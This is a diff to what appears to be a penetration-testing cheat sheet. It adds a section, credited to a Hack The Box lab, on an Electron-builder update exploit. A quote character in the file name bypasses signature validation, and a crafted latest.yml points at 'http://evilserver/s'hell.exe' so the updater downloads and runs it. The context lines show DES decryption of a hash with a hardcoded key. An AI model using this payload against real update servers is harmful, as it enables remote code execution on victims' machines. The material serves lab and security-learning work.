@@ -964,3 +964,13 @@ hash = base64.b64decode('<hash>'.encode('utf-8'))
 key = DesKey(b"7ly6UznJ")
 print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
 ```
+
+### Electron-builder RCE (Thanks to @htb lab)
+
+By adding a `'` to the the filename you are able to bypass signature validation during the update. Craft the malicious payload and name it `latest.yml`. This will force the server to download and execute your payloads.
+
+```
+version: 1.2.3
+path: http://evilserver/s'hell.exe
+sha512: <sha512_of_shell_dot_exe>
+```
